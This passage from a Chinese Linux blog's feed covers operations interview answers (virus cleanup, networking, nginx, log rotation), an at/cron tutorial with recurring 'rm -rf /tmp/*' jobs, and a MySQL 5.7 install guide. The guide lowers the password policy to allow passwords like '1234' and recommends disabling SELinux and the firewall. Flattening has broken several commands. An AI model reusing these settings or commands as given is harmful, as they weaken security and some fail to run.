src="http://www.yunweipai.com/wp-content/uploads/2019/02/20190215101532.png" alt=""><br>B、如何排查服务器故障的处理步骤如下：<br><img src="http://www.yunweipai.com/wp-content/uploads/2019/02/20190215101553.png" alt=""></p><h1 id="28、Linux系统中病毒怎么解决"><a href="#28、Linux系统中病毒怎么解决" class="headerlink" title="28、Linux系统中病毒怎么解决"></a>28、Linux系统中病毒怎么解决</h1><p><code>1）最简单有效的方法就是重装系统2）要查的话就是找到病毒文件然后删除中毒之后一般机器cpu、内存使用率会比较高机器向外发包等异常情况，排查方法简单介绍下top 命令找到cpu使用率最高的进程一般病毒文件命名都比较乱，可以用 ps aux 找到病毒文件位置rm -f 命令删除病毒文件检查计划任务、开机启动项和病毒文件目录有无其他可以文件等3）由于即使删除病毒文件不排除有潜伏病毒，所以最好是把机器备份数据之后重装一下</code></p><h1 id="29、发现一个病毒文件你删了他又自动创建怎么解决"><a href="#29、发现一个病毒文件你删了他又自动创建怎么解决" class="headerlink" title="29、发现一个病毒文件你删了他又自动创建怎么解决"></a>29、发现一个病毒文件你删了他又自动创建怎么解决</h1><p><code>公司的内网某台linux服务器流量莫名其妙的剧增,用iftop查看有连接外网的情况针对这种情况一般重点查看netstat连接的外网ip和端口。</code></p><p><code>用lsof -p pid可以查看到具体是那些进程，哪些文件经查勘发现/root下有相关的配置conf.n hhe两个可疑文件，rm -rf后不到一分钟就自动生成了由此推断是某个母进程产生的这些文件。所以找到母进程就是找到罪魁祸首</code></p><p><code>查杀病毒最好断掉外网访问，还好是内网服务器，可以通过内网访问断了内网，病毒就失去外联的能力，杀掉它就容易的多怎么找到呢，找了半天也没有看到蛛丝马迹，没办法只有ps axu一个个排查方法是查看可以的用户和和系统相似而又不是的冒牌货，果然，看到了如下进程可疑</code></p><p>看不到图片就是/usr/bin/.sshd<br>于是我杀掉所有.sshd相关的进程，然后直接删掉.sshd这个可执行文件<br>然后才删掉了文章开头提到的自动复活的文件</p><p>总结一下，遇到这种问题，如果不是太严重，尽量不要重装系统<br>一般就是先断外网，然后利用iftop,ps,netstat,chattr,lsof,pstree这些工具顺藤摸瓜<br>一般都能找到元凶。但是如果遇到诸如此类的问题<br>/boot/efi/EFI/redhat/grub.efi: Heuristics.Broken.Executable FOUND，个人觉得就要重装系统了</p><h1 id="30、说说TCP-IP的七层模型"><a href="#30、说说TCP-IP的七层模型" class="headerlink" title="30、说说TCP/IP的七层模型"></a>30、说说TCP/IP的七层模型</h1><p><code>应用层 (Application)：网络服务与最终用户的一个接口。协议有：HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POP3 DHCP</code></p><p><code>表示层（Presentation Layer）：数据的表示、安全、压缩。（在五层模型里面已经合并到了应用层）格式有，JPEG、ASCll、DECOIC、加密格式等</code></p><p><code>会话层（Session Layer）：建立、管理、终止会话。（在五层模型里面已经合并到了应用层）对应主机进程，指本地主机与远程主机正在进行的会话</code></p><p><code>传输层 (Transport)：定义传输数据的协议端口号，以及流控和差错校验。协议有：TCP UDP，数据包一旦离开网卡即进入网络传输层</code></p><p><code>网络层 (Network)：进行逻辑地址寻址，实现不同网络之间的路径选择。协议有：ICMP IGMP IP（IPV4 IPV6） ARP RARP</code></p><p><code>数据链路层 (Link)：建立逻辑连接、进行硬件地址寻址、差错校验等功能。（由底层网络定义协议）将比特组合成字节进而组合成帧，用MAC地址访问介质，错误发现但不能纠正</code></p><p><code>物理层（Physical Layer）：是计算机网络OSI模型中最低的一层物理层规定:为传输数据所需要的物理链路创建、维持、拆除而提供具有机械的，电子的，功能的和规范的特性</code></p><p>简单的说，物理层确保原始的数据可在各种物理媒体上传输。局域网与广域网皆属第1、2层<br>物理层是OSI的第一层，它虽然处于最底层，却是整个开放系统的基础<br>物理层为设备之间的数据通信提供传输媒体及互连设备，为数据传输提供可靠的环境<br>如果您想要用尽量少的词来记住这个第一层，那就是“信号和介质”</p><h1 id="31、你常用的Nginx模块，用来做什么"><a href="#31、你常用的Nginx模块，用来做什么" class="headerlink" title="31、你常用的Nginx模块，用来做什么"></a>31、你常用的Nginx模块，用来做什么</h1><pre><code>rewrite模块，实现重写功能access模块：来源控制ssl模块：安全加密ngx_http_gzip_module：网络传输压缩模块ngx_http_proxy_module 模块实现代理ngx_http_upstream_module模块实现定义后端服务器列表ngx_cache_purge实现缓存清除功能</code></pre><h1 id="32、请列出你了解的web服务器负载架构"><a href="#32、请列出你了解的web服务器负载架构" class="headerlink" title="32、请列出你了解的web服务器负载架构"></a>32、请列出你了解的web服务器负载架构</h1><p><code>Nginx,Haproxy,Keepalived,LVS</code></p><h1 id="33、查看http的并发请求数与其TCP连接状态"><a href="#33、查看http的并发请求数与其TCP连接状态" class="headerlink" title="33、查看http的并发请求数与其TCP连接状态"></a>33、查看http的并发请求数与其TCP连接状态</h1><pre><code>netstat -n | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’还有ulimit -n 查看linux系统打开最大的文件描述符，这里默认1024不修改这里web服务器修改再大也没用，若要用就修改很几个办法，这里说其中一个：修改/etc/security/limits.confsoft nofile 10240hard nofile 10240重启后生效</code></pre><h1 id="34、用tcpdump嗅探80端口的访问看看谁最高"><a href="#34、用tcpdump嗅探80端口的访问看看谁最高" class="headerlink" title="34、用tcpdump嗅探80端口的访问看看谁最高"></a>34、用tcpdump嗅探80端口的访问看看谁最高</h1><p><code>tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F”.” ‘{print $1″.”$2″.”$3″.”$4}’| sort | uniq -c | sort -nr |head -20</code></p><h1 id="35、写一个脚本，实现判断192-168-1-0-24网络里，当前在线的IP有哪些，能ping通则认为在线"><a href="#35、写一个脚本，实现判断192-168-1-0-24网络里，当前在线的IP有哪些，能ping通则认为在线" class="headerlink" title="35、写一个脚本，实现判断192.168.1.0/24网络里，当前在线的IP有哪些，能ping通则认为在线"></a>35、写一个脚本，实现判断192.168.1.0/24网络里，当前在线的IP有哪些，能ping通则认为在线</h1><pre><code>!/bin/bashfor ip in seq 1 255do{ping -c 1 192.168.1.$ip &gt; /dev/null 2&gt;&amp;1if [ $? -eq 0 ]; thenecho 192.168.1.$ip UPelseecho 192.168.1.$ip DOWNfi}&amp;donewait</code></pre><h1 id="36、已知-apache-服务的访问日志按天记录在服务器本地目录-app-logs-下，由于磁盘空间紧张现在要求只能保留最近-7-天的访问日志！请问如何解决？-请给出解决办法或配置或处理命令"><a href="#36、已知-apache-服务的访问日志按天记录在服务器本地目录-app-logs-下，由于磁盘空间紧张现在要求只能保留最近-7-天的访问日志！请问如何解决？-请给出解决办法或配置或处理命令" class="headerlink" title="36、已知 apache 服务的访问日志按天记录在服务器本地目录/app/logs 下，由于磁盘空间紧张现在要求只能保留最近 7 天的访问日志！请问如何解决？ 请给出解决办法或配置或处理命令"></a>36、已知 apache 服务的访问日志按天记录在服务器本地目录/app/logs 下，由于磁盘空间紧张现在要求只能保留最近 7 天的访问日志！请问如何解决？ 请给出解决办法或配置或处理命令</h1><p>创建文件脚本：</p><pre><code>!/bin/bashfor n in seq 14dodate -s “11/0$n/14”touch access_www_(date +%F).logdone</code></pre><p>解决方法：</p><pre><code>pwd/application/logsll-rw-r–r–. 1 root root 0 Jan 1 00:00 access_www_2015-01-01.log-rw-r–r–. 1 root root 0 Jan 2 00:00 access_www_2015-01-02.log-rw-r–r–. 1 root root 0 Jan 3 00:00 access_www_2015-01-03.log-rw-r–r–. 1 root root 0 Jan 4 00:00 access_www_2015-01-04.log-rw-r–r–. 1 root root 0 Jan 5 00:00 access_www_2015-01-05.log-rw-r–r–. 1 root root 0 Jan 6 00:00 access_www_2015-01-06.log-rw-r–r–. 1 root root 0 Jan 7 00:00 access_www_2015-01-07.log-rw-r–r–. 1 root root 0 Jan 8 00:00 access_www_2015-01-08.log-rw-r–r–. 1 root root 0 Jan 9 00:00 access_www_2015-01-09.log-rw-r–r–. 1 root root 0 Jan 10 00:00 access_www_2015-01-10.log-rw-r–r–. 1 root root 0 Jan 11 00:00 access_www_2015-01-11.log-rw-r–r–. 1 root root 0 Jan 12 00:00 access_www_2015-01-12.log-rw-r–r–. 1 root root 0 Jan 13 00:00 access_www_2015-01-13.log-rw-r–r–. 1 root root 0 Jan 14 00:00 access_www_2015-01-14.logfind /application/logs/ -type f -mtime +7 -name “*.log”|xargs rm –f也可以使用-exec rm -f {} ;进行删除ll-rw-r–r–. 1 root root 0 Jan 7 00:00 access_www_2015-01-07.log-rw-r–r–. 1 root root 0 Jan 8 00:00 access_www_2015-01-08.log-rw-r–r–. 1 root root 0 Jan 9 00:00 access_www_2015-01-09.log-rw-r–r–. 1 root root 0 Jan 10 00:00 access_www_2015-01-10.log-rw-r–r–. 1 root root 0 Jan 11 00:00 access_www_2015-01-11.log-rw-r–r–. 1 root root 0 Jan 12 00:00 access_www_2015-01-12.log-rw-r–r–. 1 root root 0 Jan 13 00:00 access_www_2015-01-13.log-rw-r–r–. 1 root root 0 Jan 14 00:00 access_www_2015-01-14.log</code></pre><h1 id="37、如何优化-Linux系统（可以不说太具体）？"><a href="#37、如何优化-Linux系统（可以不说太具体）？" class="headerlink" title="37、如何优化 Linux系统（可以不说太具体）？"></a>37、如何优化 Linux系统（可以不说太具体）？</h1><pre><code>不用root，添加普通用户，通过sudo授权管理更改默认的远程连接SSH服务端口及禁止root用户远程连接定时自动更新服务器时间配置国内yum源关闭selinux及iptables（iptables工作场景如果有外网IP一定要打开，高并发除外）调整文件描述符的数量精简开机启动服务（crond rsyslog network sshd）内核参数优化（/etc/sysctl.conf）更改字符集，支持中文，但建议还是用英文字符集，防止乱码锁定关键系统文件清空/etc/issue，去除系统及内核版本登录前的屏幕显示</code></pre><h1 id="38、请执行命令取出-linux-中-eth0-的-IP-地址-请用-cut，有能力者也可分别用-awk-sed-命令答"><a href="#38、请执行命令取出-linux-中-eth0-的-IP-地址-请用-cut，有能力者也可分别用-awk-sed-命令答" class="headerlink" title="38、请执行命令取出 linux 中 eth0 的 IP 地址(请用 cut，有能力者也可分别用 awk,sed 命令答)"></a>38、请执行命令取出 linux 中 eth0 的 IP 地址(请用 cut，有能力者也可分别用 awk,sed 命令答)</h1><pre><code>cut方法1：ifconfig eth0|sed -n ‘2p’|cut -d “:” -f2|cut -d ” ” -f1192.168.20.130awk方法2：ifconfig eth0|awk ‘NR==2’|awk -F “:” ‘{print $2}’|awk ‘{print $1}’192.168.20.130awk多分隔符方法3：ifconfig eth0|awk ‘NR==2’|awk -F “[: ]+” ‘{print $4}’192.168.20.130sed方法4：ifconfig eth0|sed -n ‘/inet addr/p’|sed -r ‘s#^.ddr:(.)Bc.*$##g’192.168.20.130</code></pre><h1 id="39、请写出下面-linux-SecureCRT-命令行快捷键命令的功能？"><a href="#39、请写出下面-linux-SecureCRT-命令行快捷键命令的功能？" class="headerlink" title="39、请写出下面 linux SecureCRT 命令行快捷键命令的功能？"></a>39、请写出下面 linux SecureCRT 命令行快捷键命令的功能？</h1><pre><code>Ctrl + aCtrl + cCtrl + dCtrl + eCtrl + lCtrl + uCtrl + ktabCtrl+shift+cCtrl+shift+v</code></pre><p>解答：</p><pre><code>Ctrl + a —-&gt;光标移动到行首Ctrl + e —-&gt;光标移动到行尾Ctrl + c —-&gt;终止当前程序Ctrl + d —-&gt;如果光标前有字符则删除，没有则退出当前中断Ctrl + l —-&gt;清屏Ctrl + u —-&gt;剪切光标以前的字符Ctrl + k —-&gt;剪切光标以后的字符Ctrl + y —-&gt;复制u/k的内容Ctrl + r —-&gt;查找最近用过的命令tab —-&gt;命令或路径补全Ctrl+shift+c —-&gt;复制Ctrl+shift+v —-&gt;粘贴</code></pre><h1 id="40、每天晚上-12-点，打包站点目录-var-www-html-备份到-data-目录下（最好每次备份按时间生成不同的备份包）"><a href="#40、每天晚上-12-点，打包站点目录-var-www-html-备份到-data-目录下（最好每次备份按时间生成不同的备份包）" class="headerlink" title="40、每天晚上 12 点，打包站点目录/var/www/html 备份到/data 目录下（最好每次备份按时间生成不同的备份包）"></a>40、每天晚上 12 点，打包站点目录/var/www/html 备份到/data 目录下（最好每次备份按时间生成不同的备份包）</h1><pre><code>cat a.sh/bin/bashcd /var/www/ &amp;&amp; /bin/tar zcf /data/html-date +%m-%d%H.tar.gz html/crontab –e00 00 * * * /bin/sh /root/a.sh</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> Operation </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux计划任务</title>
+      <link href="/2019/09/13/at-and-cron/"/>
+      <url>/2019/09/13/at-and-cron/</url>
+      
+        <content type="html"><![CDATA[<h1>centos7—计划任务（at、cron）</h1><p>计划任务：让计算机在指定的时间执行指定的事情<br><a id="more"></a></p><h1 id="1、分类：一次性计划任务：at（临时的计划任务）、周期性计划任务：cron"><a href="#1、分类：一次性计划任务：at（临时的计划任务）、周期性计划任务：cron" class="headerlink" title="1、分类：一次性计划任务：at（临时的计划任务）、周期性计划任务：cron"></a>1、分类：一次性计划任务：at（临时的计划任务）、周期性计划任务：cron</h1><h1 id="2、计划任务管理：查atq、创建at、删除atrm"><a href="#2、计划任务管理：查atq、创建at、删除atrm" class="headerlink" title="2、计划任务管理：查atq、创建at、删除atrm"></a>2、计划任务管理：查atq、创建at、删除atrm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注：服务器重启一般都是晚上   凌晨2点</span><br><span class="line">at 时间</span><br><span class="line">atq   或  at  -l    查计划列表</span><br><span class="line">    eg.  at 20:00</span><br><span class="line">          at&gt; poweroff      关机</span><br><span class="line">          at&gt; ctrl+d</span><br></pre></td></tr></table></figure><p>3、时间的写法</p><pre><code>HH:MM   //18:30midnight   //0点 (午夜)noon   //12点 (中午)  teatime //16点(下午4点)AM  或   PM后缀指定一天的上午或下午。  //at  2:00 pmMMDDYY  、  MM/DD/YY 或 DD.MM.YYnow + 计数  时间单位(minutes  、hours  、  days 或 weeks)    eg. at now + 3 hours(从现在开始起三个小时后)    eg. at 4pm  + 3 days   //三天以后的下午4点执行一个任务         at 2am + tomorrom  //明天上午2点         at 10am Jul 31   //7月31日上午10点</code></pre><h1 id="案例一：凌晨2点备份-etc目录-到-tmp格式为-etc-tar-xz"><a href="#案例一：凌晨2点备份-etc目录-到-tmp格式为-etc-tar-xz" class="headerlink" title="案例一：凌晨2点备份/etc目录 到 /tmp格式为 etc.tar.xz"></a>案例一：凌晨2点备份/etc目录 到 /tmp格式为 etc.tar.xz</h1><pre><code>at 02:00at&gt; tar cvJf /tmp/etc.tar.xz /etcat&gt; ctrl+d</code></pre><p>4、查看所有用户的计划任务</p><pre><code>atqat -l</code></pre><p>5、查看某个计划任务的详细内容</p><pre><code>at -c 工作号</code></pre><p>6、删除计划任务</p><pre><code>atrm 工作号 ...at -d 工作号 ...</code></pre><h1 id="案例二：脚本方式创建at计划任务"><a href="#案例二：脚本方式创建at计划任务" class="headerlink" title="案例二：脚本方式创建at计划任务."></a>案例二：脚本方式创建at计划任务.</h1><pre><code>echo  &apos;ls;date;pwd&apos;  | at  3:00      #用管道符将任务传给at命令</code></pre><h1 id="案例三：用at将指定文件-f-文件名-中的命令设为计划任务"><a href="#案例三：用at将指定文件-f-文件名-中的命令设为计划任务" class="headerlink" title="案例三：用at将指定文件(-f  文件名)中的命令设为计划任务."></a>案例三：用at将指定文件(-f  文件名)中的命令设为计划任务.</h1><pre><code>#首先,创建命令文件vim /opt/aplan      #添加如下内容    ls    date    pwd    tar -czvf /tmp/etc.tar.gz /etc</code></pre><h1 id="各例子展示："><a href="#各例子展示：" class="headerlink" title="各例子展示："></a>各例子展示：</h1><pre><code># at 5pm+3 days    #三天后的下午5点,执行 /bin/lsat&gt; /bin/lsat&gt; job 7 at 2019-09-13 17:00# at 17:20 tomorrow    #明天17点钟，输出时间到指定文件内at&gt; date &gt;/root/date.log         at&gt; job 8 at 2019-09-13 17:20# atq      #查看任务8       2019-09-13 17:20 a root7       2019-09-13 17:00 a root# atrm 7     #删除任务# atq 8       2019-09-13 17:20 a root# 指定在今天下午5:30执行某命令。以下命令格式，结果都一样：# at 5:30pm # at 17:30 # at 17:30 today # at now + 5 hours # at now + 300 minutes # at 17:30 24.2.99 # at 17:30 2/24/99 # at 17:30 Feb 24 # at -f /home/test/work 4pm + 3 days     #在三天后下午4点执行文档work中的作业</code></pre><h1 id="7、at权限管理、安全"><a href="#7、at权限管理、安全" class="headerlink" title="7、at权限管理、安全"></a>7、at权限管理、安全</h1><pre><code>/etc/at.allow      白名单：只允许在此名单内的用户使用at（此文件本身不存在）/etc/at.deny      黑名单：在此名单内的用户不可以使用at注：当两个文件都不存在，只有root用户可以使用at      当两个文件都存在，allow优先执行</code></pre><hr><h1 id="at服务管理："><a href="#at服务管理：" class="headerlink" title="at服务管理："></a>at服务管理：</h1><pre><code>查at软件是否已安装：pm -q at  查at的文件列表：rpm -ql at查at的定时列表：at -l查看单个at任务内容：at -c 工作号查at的配置文件列表：rpm -qc at查at服务状态：systemctl status atd   或   service atd status重启at服务：systemctl restart atd   或   service atd restart关闭at服务：systemctl stop atd   或   service atd stop开机不启动at服务：systemctl disable atd   或   chkconfig atd off开机启动at服务：systemctl enable atd   或   chkconfig atd on</code></pre><h1 id="at的其他文件"><a href="#at的其他文件" class="headerlink" title="at的其他文件:"></a>at的其他文件:</h1><pre><code>计划文件清单:ls   /var/spool/at/*    用cat可以看这些文件</code></pre><hr><h1 id="cron：周期性计划任务、循环性计划任务，主要用于备份数据。"><a href="#cron：周期性计划任务、循环性计划任务，主要用于备份数据。" class="headerlink" title="cron：周期性计划任务、循环性计划任务，主要用于备份数据。"></a>cron：周期性计划任务、循环性计划任务，主要用于备份数据。</h1><pre><code>crontab  usage:crontab [-u user] [ -e | -l | -r ]-u &lt;user&gt;  define user      #指定用户-e      edit user&apos;s crontab      #编辑计划任务-l      list user&apos;s crontab      #查看计划任务-r      delete user&apos;s crontab      #删除计划任务1、crontab -e      编辑周期性计划任务的内容2、查看配置:cat   /etc/crontab</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">时间</span><br><span class="line">min     hour   day  month  week    command</span><br><span class="line">分钟     小时      日      月         周      动作(任务命令)    </span><br><span class="line">0-59     0-23    1-31   1-12   0-7    命令或脚本(写绝对路径)</span><br><span class="line">30         2         1      *       *      rm -rf /tmp/*   //每月1号的2：30分删除/tmp目录下的所有文件</span><br><span class="line">5           *          *       6      3    rm -rf /tmp/*   //每年6月的每周三每小时的5分钟删除/tmp目录下的所有文件</span><br><span class="line">6           6         *       6     6    rm -rf /tmp/*    //每年6月的周六的6点6分钟删除/tmp目录下的所有文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*  任何时刻</span><br><span class="line">-   一段时间  //  8-11 *  *  *  *   rm -rf /tmp/*    //每小时的8分钟 9分钟 10分钟 11分钟 删除/tmp目录下所有文件     </span><br><span class="line">,  分隔(不连续的时间)       //  1,2,5,9   *  *  *  *   rm -rf /tmp/*  //每小时的1分钟 2分钟 5分钟 9分钟 删除/tmp目录下所有文件     </span><br><span class="line">0-4,8-12    //</span><br><span class="line">0-23/2  时间间隔  //1  0-23/2   *  *   *  rm -rf /tmp/*    // &quot;0,2,4,6,8,10,12,14,16,18,20,22&quot;).</span><br><span class="line">*/2    每隔2小时     //1    */2   *  *   *  rm -rf /tmp/*     每隔2小时执行rm命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*  0-23  *  *  *  rm -rf /tmp/*   </span><br><span class="line">*   */1   *  *  *  rm -rf /tmp/*</span><br></pre></td></tr></table></figure><p>3、时间的写法<br>The time and date fields are:</p><pre><code>field          allowed values-----          --------------minute         0-59hour           0-23day of month   1-31month          1-12  (or  names,see below)day  of  week    0-7  (0 or 7 isSun, or use names)</code></pre><h1 id="案例一：每个星期三的下午10：00备份-etc-目录到-tmp目录叫2019-09-13-etc-tar-gz备份文件包含当天日期"><a href="#案例一：每个星期三的下午10：00备份-etc-目录到-tmp目录叫2019-09-13-etc-tar-gz备份文件包含当天日期" class="headerlink" title="案例一：每个星期三的下午10：00备份/etc/目录到/tmp目录叫2019-09-13_etc.tar.gz备份文件包含当天日期"></a>案例一：每个星期三的下午10：00备份/etc/目录到/tmp目录叫2019-09-13_etc.tar.gz备份文件包含当天日期</h1><pre><code> crontab -e * 22 * * 3 /usr/bin/tar cvzf /tmp/`/usr/bin/date +%F`_etc.tar.gz /etc （注:`命令`中的``为命令替换功能,系统会先执行``(反撇，反引号)中的命令．也可以将``写成$()）</code></pre><h1 id="案例二：只保留最近1个月的日志文件"><a href="#案例二：只保留最近1个月的日志文件" class="headerlink" title="案例二：只保留最近1个月的日志文件"></a>案例二：只保留最近1个月的日志文件</h1><pre><code>crontab -e1 * * * *  find /var/log -mtime +30 |xarge -i rm -rf {}</code></pre><h1 id="案例三：每月1号的凌晨2点半清空临时盘"><a href="#案例三：每月1号的凌晨2点半清空临时盘" class="headerlink" title="案例三：每月1号的凌晨2点半清空临时盘"></a>案例三：每月1号的凌晨2点半清空临时盘</h1><pre><code>crontab -e30  2  1  *  *  /usr/bin/rm -rf /tmp/* </code></pre><h1 id="案例四：每周每天的晚上8：10关闭电脑，除了星期六，星期五-星期日的17：10关闭电脑"><a href="#案例四：每周每天的晚上8：10关闭电脑，除了星期六，星期五-星期日的17：10关闭电脑" class="headerlink" title="案例四：每周每天的晚上8：10关闭电脑，除了星期六，星期五,星期日的17：10关闭电脑"></a>案例四：每周每天的晚上8：10关闭电脑，除了星期六，星期五,星期日的17：10关闭电脑</h1><pre><code>crontab -e10 20 * * 1-4  /usr/sbin/poweroff10 17 * * 5,7  /usr/sbin/poweroff</code></pre><h1 id="案例五：max用户每天在家目录创建一个以日期命名的目录20190913"><a href="#案例五：max用户每天在家目录创建一个以日期命名的目录20190913" class="headerlink" title="案例五：max用户每天在家目录创建一个以日期命名的目录20190913"></a>案例五：max用户每天在家目录创建一个以日期命名的目录20190913</h1><pre><code>crontab -u max -e1  0  *  *  *  /bin/mkdir  /home/max/`date +%Y%m%d`</code></pre><p>4、查询周期性计划任务的内容</p><pre><code>crontab -l      #查看当前用户定时运行的程序crontab -u jim -      #查看指定用户</code></pre><p>5、删除某用户的所有周期性计划任务(删除某个计划任务crontab -e 进入文本删除)</p><pre><code>crontab -r      #当前用户crontab -u jim -r      #指定用户</code></pre><p>系统定义的计划任务(默认)</p><pre><code>  更新whatis数据库  更新updatedb数据库  日志定期轮滚(日志切割)  清理/tmp /var/tmp  收集系统的状态信息vim /etc/crontab  配置文件        # For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed  */5 * * * *   root  命令   //每隔5分钟以root身份去执行命令</code></pre><h1 id="以下目录内可以存在脚本-该脚本就会按照时间去执行"><a href="#以下目录内可以存在脚本-该脚本就会按照时间去执行" class="headerlink" title="以下目录内可以存在脚本  该脚本就会按照时间去执行"></a>以下目录内可以存在脚本  该脚本就会按照时间去执行</h1><pre><code>cd /etccron.hourly/      #每小时cron.weekly/      #每周cron.daily/      #每天cron.monthly/      #每月</code></pre><h1 id="6、删除超过一个月不使用的文件"><a href="#6、删除超过一个月不使用的文件" class="headerlink" title="6、删除超过一个月不使用的文件"></a>6、删除超过一个月不使用的文件</h1><pre><code>cat /etc/cron.daily/tmpwatch</code></pre><h1 id="7、crontab服务管理："><a href="#7、crontab服务管理：" class="headerlink" title="7、crontab服务管理："></a>7、crontab服务管理：</h1><pre><code>查软件是否已安装：rpm  -q  crontabs查软件的文件列表：rpm  -ql  crontabs查软件的配置文件列表：rpm -qc crontabs服务状态：systemctl   status   crond       注：d是daemon守护进程重启at服务: systemctl   restart   crond   或  service   crond  restart关闭at服务: systemctl   stop   crond   或  service   crond  stop开机不启动at服务: systemctl   disable  crond 或 chkconfig   crond  off开机启动at服务:  systemctl   enable   crond  或 chkconfig   crond  on</code></pre><h1 id="8、cron权限管理"><a href="#8、cron权限管理" class="headerlink" title="8、cron权限管理"></a>8、cron权限管理</h1><pre><code>/etc/cron.allow      白名单：只允许在此名单内的用户使用crontab（此文件本身不存在）/etc/cron.deny      黑名单：在此名单内的用户不可以使用crontab      注：两个文件都不存在，只有root用户可以使用crontab             两个文件都存在，allow优先执行</code></pre><p>本博客参照编写☞博客：<a href="https://blog.csdn.net/qq_34889607/article/details/78635141" target="_blank" rel="noopener">https://blog.csdn.net/qq_34889607/article/details/78635141</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> crontab </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Install mysql5.7</title>
+      <link href="/2019/09/12/mysql5.7/"/>
+      <url>/2019/09/12/mysql5.7/</url>
+      
+        <content type="html"><![CDATA[<h1>CentOS7 yum方式安装MySQL5.7</h1><p>在CentOS中默认安装有MariaDB，这个是MySQL的分支，但为了需要，还是要在系统中安装MySQL，而且安装完成之后可以直接覆盖掉MariaDB。<br><a id="more"></a><br>1 下载并安装MySQL官方的 Yum Repository</p><pre><code>[root@localhost ~]# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm</code></pre><p>  使用上面的命令就直接下载了安装用的Yum Repository，大概25KB的样子，然后就可以直接yum安装了。</p><pre><code>[root@localhost ~]# yum -y install mysql57-community-release-el7-10.noarch.rpm     </code></pre><p>  之后就开始安装MySQL服务器。</p><pre><code>[root@localhost ~]# yum -y install mysql-community-server</code></pre><p>这步可能会花些时间，安装完成后就会覆盖掉之前的mariadb。</p><pre><code>已安装：      mysql-community-libs.x86_64 0:5.7.19-1.el7      mysql-community-libs-compat.x86_64 0:5.7.19-1.el7      mysql-community-server.x86_64 0:5.7.19-1.el7  作为依赖被安装：        mysql-community-client.x86_64 0:5.7.19-1.el7        mysql-community-common.x86_64 0:5.7.19-1.el7  替代：        mariadb-libs.x86_64 1:5.5.52-1.el7  完毕！至此MySQL就安装完成了，然后是对MySQL的一些设置。</code></pre><p>2 MySQL数据库设置</p><p>  首先启动MySQL<br>    <code>root@localhost ~]# systemctl start  mysqld.service</code><br>  查看MySQL运行状态，如果为running状态就是ySQL已经开始正常运行<br>    <code>[root@localhost ~]# systemctl status mysqld.service</code><br>  不过要想进入MySQL还得先找出此时root用户的密码，通过如下命令可以在日志文件中找出密码：<br>    <code>[root@localhost ~]# grep &quot;password&quot; /var/log/mysqld.log</code><br>  如下命令输入账号密码进入数据库：<br>    <code>[root@localhost ~]# mysql -uroot -p</code><br>  输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库：<br>    <code>mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new password&#39;;</code><br>  这里有个问题，新密码设置的时候如果设置的过于简单会报错：<br>  <code>ERROR 1819(HY000):Your password does not satisfy the current policy_requirements</code><br>  原因是因为MySQL有密码设置的规范，具体是与validate_password_policy的值有关：<br> <img src="/2019/09/12/mysql5.7/policy.png" alt=""><br>  MySQL完整的初始密码规则可以通过如下命令查看：</p><pre><code>mysql&gt; SHOW VARIABLES LIKE &apos;validate_password%&apos;;+--------------------------------------+-------+| Variable_name                        | Value |+--------------------------------------+-------+| validate_password_check_user_name    | OFF   || validate_password_dictionary_file    |       || validate_password_length             | 4     || validate_password_mixed_case_count   | 1     || validate_password_number_count       | 1     || validate_password_policy             | LOW   || validate_password_special_char_count | 1     |+--------------------------------------+-------+7 rows in set (0.01 sec)</code></pre><p> 密码的长度是由validate_password_length决定的，而validate_password_length的计算公式是：</p><p><code>validate_password_length = validate_password_number_count + validate_password_special_char_count + (2 *   validate_password_mixed_case_count)</code></p><p> 我的是已经修改过的，初始情况下第一个的值是ON，validate_password_length是8。可以通过如下命令修改：</p><pre><code>mysql&gt; set global validate_password_policy=0;mysql&gt; set global validate_password_length=1;</code></pre><p> 设置之后就是我上面查出来的那几个值了，此时密码就可以设置的很简单，例如1234之类的。到此数据库的密码设置就完成了。<br> 但此时还有一个问题，就是因为安装了Yum Repository，以后每次yum操作都会自动更新，需要把这个卸载掉：<br>  <code>[root@localhost ~]# yum -y remove mysql57-community-release-el7-10.noarch</code><br>  此时才算真的完成了。<br> 本博客参照☞博客：<a href="https://www.cnblogs.com/bigbrotherer/p/7241845.html" target="_blank" rel="noopener">https://www.cnblogs.com/bigbrotherer/p/7241845.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> MySQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Install ElasticSearch</title>
+      <link href="/2019/09/11/ElasticSearch/"/>
